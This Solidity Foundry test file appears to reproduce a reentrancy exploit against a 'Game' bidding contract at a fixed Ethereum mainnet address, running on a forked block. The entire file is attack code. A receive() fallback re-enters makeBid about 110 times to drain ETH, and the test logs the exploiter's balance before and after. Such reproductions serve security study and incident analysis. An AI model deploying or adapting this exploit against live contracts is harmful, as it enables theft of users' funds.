// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/interface/interface.sol";
import "forge-std/console2.sol";

interface IGame {
    function newBidEtherMin() external view returns (uint256);

    function makeBid() external payable;
}

contract ContractTest is Test {
    IGame private constant Game =
        IGame(0x52d69c67536f55EfEfe02941868e5e762538dBD6);
    uint8 private reentrancyCalls;

    function setUp() public {
        vm.createSelectFork("mainnet", 19213946);
        vm.label(address(Game), "Game");
    }

    function testExploit() public {
        vm.deal(address(this), 0.6 ether);
        emit log_named_decimal_uint(
            "Exploiter ETH balance before: ",
            address(this).balance,
            18
        );

        uint256 bid = (address(this).balance * 49) / 100;
        console2.log("bid: ", bid);
        Game.makeBid{value: bid}();
        console2.log("bid2: ", bid);
        makeBadBid();
        emit log_named_decimal_uint(
            "Exploiter ETH balance after: ",
            address(this).balance,
            18
        );
    }

    receive() external payable {
        if (reentrancyCalls <= 109) {
            ++reentrancyCalls;
            makeBadBid();
        } else {
            return;
        }
    }

    function makeBadBid() internal {
        uint256 badBid = Game.newBidEtherMin() + 1;
        Game.makeBid{value: badBid}();
    }
}
